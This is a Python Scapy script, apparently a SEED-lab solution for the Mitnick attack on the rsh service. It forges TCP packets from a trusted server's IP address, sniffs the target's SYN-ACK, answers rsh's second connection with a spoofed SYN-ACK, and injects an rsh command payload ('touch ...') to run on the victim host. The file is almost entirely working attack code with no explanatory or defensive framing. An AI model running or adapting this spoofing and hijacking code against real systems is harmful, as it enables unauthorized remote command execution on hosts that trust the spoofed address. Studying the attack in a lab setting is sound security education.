from scapy.all import *

'''def syn_ack_filter(packet):
	if packet.haslayer(IP) and packet.haslayer(TCP):
		if packet[TCP].flags == 0x12 and packet[IP].src == '192.168.159.130'
			return True
	return False
'''
def send_ACK(packet):
	if packet.haslayer(IP) and packet.haslayer(TCP):
		if packet[TCP].flags == 0x12 and packet[IP].src == '192.168.159.130' and packet[IP].dst == '192.168.159.132':
			ip = IP(src=packet[IP].dst, dst = packet[IP].src)
			tcp = TCP(sport=packet[TCP].dport , dport =packet[TCP].sport, flags = "A", seq=packet[TCP].ack, ack=packet[TCP].seq+1)
			data = '1022\x00seed\x00seed\x00touch AAAAAAAAAAA\x00'
			pkt = ip/tcp/data
			ls(pkt)
			send(pkt, verbose =0)
			ls('ACK packet sent');

def send_SYNACK(packet):
	if packet.haslayer(IP) and packet.haslayer(TCP):
		if packet[IP].src == '192.168.159.130' and packet[IP].dst == '192.168.159.132':
			if packet[TCP].flags == 0x02 and packet[TCP].sport==1023 and packet[TCP].dport==1022:
				ip = IP(src=packet[IP].dst, dst = packet[IP].src)
				tcp = TCP(sport=packet[TCP].dport , dport =packet[TCP].sport, flags = "SA", seq=2323534343, ack=packet[TCP].seq+1)
				pkt = ip/tcp
				ls(pkt)
				send(pkt, verbose =0)
				ls('SYN ACK packet sent');


x_ip = "192.168.159.130" 
x_port = 514
srv_ip = "192.168.159.132"
srv_port = 1023

ip = IP(src = srv_ip , dst = x_ip)

#SYN
tcp = TCP(sport = srv_port , dport = x_port , flags = "S" , seq = 3821295315)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

#ACK
sniff(iface='ens33', filter='tcp and ip', prn=send_ACK, count =1)

#SYNACK
sniff(iface='ens33', filter='tcp and ip', prn=send_SYNACK, count=1)

'''tcp = TCP(sport = srv_port , dport = x_port , flags = "A" , seq = 3821295315, ack =1902742321 )
data = '1022\x00seed\x00seed\x00touch NNNNNNNNNN\x00'
pkt = ip/tcp/data

ls(pkt)
send(pkt , verbose = 0)
'''

'''#Sending SYNACK for second packet
ip = IP(src = srv_ip , dst = x_ip)
tcp = TCP(sport = srv_port , dport = x_port , flags = "SA" , seq = 3821203333, ack =1764491119)

pkt = ip/tcp

ls(pkt)
send(pkt , verbose = 0)
'''

